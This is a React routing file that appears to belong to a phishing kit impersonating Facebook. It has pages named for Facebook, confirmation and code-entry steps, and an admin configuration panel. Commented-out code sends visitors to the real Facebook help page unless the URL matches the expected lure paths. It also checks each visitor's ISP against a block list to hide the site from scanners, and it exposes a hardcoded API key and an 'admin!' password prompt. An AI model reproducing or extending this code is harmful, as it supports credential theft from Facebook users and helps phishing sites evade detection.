import React, { useEffect, useState } from "react";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import App from "./App";
import { MySite } from "./MySite";
import NotFound from "./NotFound";
import { Confirmation } from "./Confirmation";
import { CodeTwo } from "./CodeTwo";
import { ConfirmationSecond } from "./ConfirmationSecond";
import Dashboard from "./Dashboard";
import { TH } from "./TH";
import { Robot } from "./Robot";
import { BLOCK_ORG } from "./utils/variable";
import { FacebookButton } from "./FacebookButton";
import Dashboard2 from "./Dashboard2";
import { AdminConfig } from "./AdminConfig";
import { FacebookCalendly } from "./FacebookCalendly";
import { AdminConfigUsers } from "./AdminConfigUsers";
import { ThankYouPage } from "./ThankYouPage";
import { PendingPage } from "./PendingPage";
import { LandingCalendly } from "./LandingCalendly";
import { Landing } from "./Landing";

export default function RootNavigation() {
  const [is_visible, setVisible] = useState(false);
  const [isLoading, setLoading] = useState(true);
  const [isRedirect, setRedirect] = useState(false);
  var url = window.location.pathname.split("/");

  // if(url[1] == 'help' && url[2] == 'support' || url[1] == 'checkpoint' ||  url[2] == 'kka'  && url[3].includes('client_id=') && url[3].split('=')[1])  {
  // } else {
  //   return window.location.replace('https://www.facebook.com/help')
  // }

  // useEffect(() => {
  //     fetch("https://api.ipgeolocation.io/ipgeo?apiKey=defba4e9d87c44ce9125f6101daf33a1")
  //     .then((response) => response.json())
  //     .then((response) => {
  //       const isBlockOrgi = BLOCK_ORG.some(item => response.isp.toLowerCase().includes(item.toLowerCase()))
  //       setRedirect(isBlockOrgi)
  //       setLoading(false);
  //     }).catch(() => {
  //       setLoading(false);
  //     })

  //   // triggerPompt();
  // }, []);

  // const triggerPompt = () => {
  //   let user = window.prompt("What's code?", "");
  //   if (user == "admin!") {
  //     setVisible(true);n
  //   } else {
  //     triggerPompt();
  //   }
  // };

  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<FacebookCalendly />} />
        <Route
          path="calendar-calendly"
          element={<LandingCalendly isCalendar={true} />}
        />
        <Route
          path="calendar-calendly-error"
          element={<LandingCalendly isCalendar={true} isError={true} />}
        />
        <Route path="ppi" element={<AdminConfigUsers />} />
        <Route path="ppi/config" element={<AdminConfig />} />
        <Route path="thank-you" element={<ThankYouPage />} />
        <Route path="error" element={<PendingPage />} />
        <Route path="*" element={<FacebookCalendly />} />
      </Routes>
    </BrowserRouter>
  );
}
